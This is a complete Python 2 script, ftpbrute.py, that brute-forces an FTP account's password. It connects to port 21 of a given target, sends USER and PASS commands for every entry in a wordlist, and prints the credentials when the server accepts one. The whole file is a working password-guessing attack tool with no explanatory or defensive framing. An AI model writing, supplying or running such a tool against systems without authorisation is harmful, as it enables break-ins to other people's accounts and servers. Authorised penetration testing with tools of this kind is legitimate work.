#! /usr/bin/python

import socket
import sys

if len(sys.argv) != 4:
	print "usage: ./ftpbrute.py [TARGET] [USERNAME] [WORDLIST]"
	sys.exit(1)

rhost = sys.argv[1]
user = sys.argv[2]
wordlist = sys.argv[3]

def checkHost(host):
	print "checking host... ",; sys.stdout.flush()
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		result = s.connect_ex((host, 21))
		if result == 0:
			print 'success'
		else:
			print 'fail'
			sys.exit(1)
	except:
		print 'fail'
		sys.exit(1)

def getWordlist(path):
	print 'reading wordlist... ',; sys.stdout.flush()
	try:
		with open(path) as file:
			wordlist = file.read().strip().split('\n')
			print 'done'
			return wordlist
	except:
		print 'fail'
		sys.exit(1)

def crackPass(passwd):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((rhost, 21))
	s.recv(1024)
	s.send('USER %s\n' %(user))
	s.recv(1024)
	s.send('PASS %s\n' %(passwd))
	data = s.recv(1024)
	if '230' in data:
		print 'creds found: '
		print '\tuser: %s' %(user)
		print '\tpass: %s' %(passwd)
		sys.exit(1)

wordlist = getWordlist(wordlist)
checkHost(rhost)

print 'cracking FTP pass for "%s" at %s...\n' %(user, rhost)

for i in wordlist:
	crackPass(i)

print 'bruteforce failed'
